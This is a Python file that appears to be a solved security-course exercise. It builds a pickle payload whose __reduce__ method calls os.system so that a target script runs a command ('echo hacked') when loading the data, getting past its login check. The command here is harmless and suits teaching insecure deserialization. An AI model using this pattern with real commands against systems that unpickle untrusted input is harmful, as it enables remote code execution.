import pickle
import os


def generate_example() -> bytes:
    # WARNING: DON'T EDIT THIS FUNCTION!
    return pickle.dumps({'username': 'dan', 'password': '1234', 'command': 'echo cool'})


class RCE:
    # Will be called by pickle.loads on a RCE pickled instance
    def __reduce__(self):
        callable_object = os.system
        tuple_args_for_callable = ('echo hacked',)
        tuple_result = (callable_object, tuple_args_for_callable)
        return tuple_result


def generate_exploit() -> bytes:
    """This function returns the payload that will print `hacked`.

    Our payload should cause `run.py` to print out `hacked` even without
    us using a valid username/password combination.

    Warnings:
    1. You must NOT use a valid username/password combination
    2. `run.py` should print `hacked`, and the testing will be case *sensitive*

    Returns:
         The bytes of the payload.
    """
    return pickle.dumps(RCE())


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    if not 2 <= len(argv) <= 3:
        print('USAGE: %s [--example] <script-path>' % argv[0])
        return 1
    if len(argv) == 2:
        example, path = False, argv[1]
    else:
        example, path = True,  argv[2]
    if example:
        script = generate_example()
    else:
        script = generate_exploit()
    with open(path, 'wb') as writer:
        writer.write(script)
    print('done')


if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
